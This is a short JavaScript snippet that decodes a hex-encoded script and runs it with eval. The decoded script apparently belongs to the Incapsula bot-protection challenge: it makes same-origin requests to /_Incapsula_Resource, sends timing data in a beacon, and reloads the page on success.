 (function() {
     var z = "";
     var b = "7472797B766172207868723B76617220743D6E6577204461746528292E67657454696D6528293B766172207374617475733D227374617274223B7661722074696D696E673D6E65772041727261792833293B77696E646F772E6F6E756E6C6F61643D66756E6374696F6E28297B74696D696E675B325D3D22723A222B286E6577204461746528292E67657454696D6528292D74293B646F63756D656E742E637265617465456C656D656E742822696D6722292E7372633D222F5F496E63617073756C615F5265736F757263653F4553324C555243543D363726743D373826643D222B656E636F6465555249436F6D706F6E656E74287374617475732B222028222B74696D696E672E6A6F696E28292B222922297D3B69662877696E646F772E584D4C4874747052657175657374297B7868723D6E657720584D4C48747470526571756573747D656C73657B7868723D6E657720416374697665584F626A65637428224D6963726F736F66742E584D4C4854545022297D7868722E6F6E726561647973746174656368616E67653D66756E6374696F6E28297B737769746368287868722E72656164795374617465297B6361736520303A7374617475733D6E6577204461746528292E67657454696D6528292D742B223A2072657175657374206E6F7420696E697469616C697A656420223B627265616B3B6361736520313A7374617475733D6E6577204461746528292E67657454696D6528292D742B223A2073657276657220636F6E6E656374696F6E2065737461626C6973686564223B627265616B3B6361736520323A7374617475733D6E6577204461746528292E67657454696D6528292D742B223A2072657175657374207265636569766564223B627265616B3B6361736520333A7374617475733D6E6577204461746528292E67657454696D6528292D742B223A2070726F63657373696E672072657175657374223B627265616B3B6361736520343A7374617475733D22636F6D706C657465223B74696D696E675B315D3D22633A222B286E6577204461746528292E67657454696D6528292D74293B6966287868722E7374617475733D3D323030297B706172656E742E6C6F636174696F6E2E72656C6F616428297D627265616B7D7D3B74696D696E675B305D3D22733A222B286E6577204461746528292E67657454696D6528292D74293B7868722E6F70656E2822474554222C222F5F496E63617073756C615F5265736F757263653F535748414E45444C3D353235373633303333313332303938303136382C31313135313533373437343931393230373039352C31363730363839303339363234323737333139302C3234323136222C66616C7365293B7868722E73656E64286E756C6C297D63617463682863297B7374617475732B3D6E6577204461746528292E67657454696D6528292D742B2220696E6361705F6578633A20222B633B646F63756D656E742E637265617465456C656D656E742822696D6722292E7372633D222F5F496E63617073756C615F5265736F757263653F4553324C555243543D363726743D373826643D222B656E636F6465555249436F6D706F6E656E74287374617475732B222028222B74696D696E672E6A6F696E28292B222922297D3B";
     for (var i = 0; i < b.length; i += 2) {
         z = z + parseInt(b.substring(i, i + 2), 16) + ",";
     }
     z = z.substring(0, z.length - 1);
     eval(eval('String.fromCharCode(' + z + ')'));
 })();
